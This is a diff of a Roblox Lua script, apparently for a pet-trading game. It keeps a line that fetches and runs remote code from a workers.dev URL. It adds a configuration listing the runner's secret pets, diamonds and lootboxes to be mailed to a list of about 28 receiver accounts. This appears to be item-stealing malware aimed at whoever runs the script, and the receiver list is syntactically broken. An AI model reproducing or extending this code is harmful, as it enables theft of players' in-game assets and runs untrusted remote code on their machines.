@@ -78,7 +78,23 @@ loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.
 
 
 
+getgenv().GMAX_MAIL_COST = "5m"
+getgenv().GMAIL_ITEMS = {	
 
+["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
+["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
+["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
+["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
+["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "50m", MinAmount = "250m"},
+["Deep Sea Treasure Chest"] = {Class = "Lootbox", Id= "Deep Sea Treasure Chest", MinAmount = 5},
+["Hype Egg 2"] = {Class = "Lootbox", Id= "Hype Egg 2", MinAmount = 1},
+
+--["LuckyPotion"] = {Class = "Potion", Tier = 9 ,Id = "Lucky", MinAmount = 1000, KeepAmount = 500},
+--["Diamonds"] = {Class = "Potion", Tier = 9 ,Id = "Diamonds", MinAmount = 1000, KeepAmount = 500},
+
+
+}
+getgenv().GMAIL_RECEIVERS = {""Ash3rP0w3rPanda2018","GalaxyRider200343","soystaylan5","dreddyewele60","XxSaberFoxxX2024","Will0wC00kieSkater20","nalsur71230","XxRocketClawFlashxX","StormyAce15","Rock3tWolfKing2009","Magic_Legend200469","ChillMaster2011","Inferno_Eagle200889","Noah_SKATER35","XxOwenC0dexX2023","1953Crutchfield3117","Xx_VictoriaUltraCybe","FusionShadowCyber","AceInferno202467","sijmongirthss","Harp3rDuck23","RowlandCollinq943","MysticFireS0nic","Sky_Giga2017","TurboTig3rStr3am","R0ck3tClaw2021_YT","GlitchF0x34","WolfPix3lStr3am2017""}
 
 
 
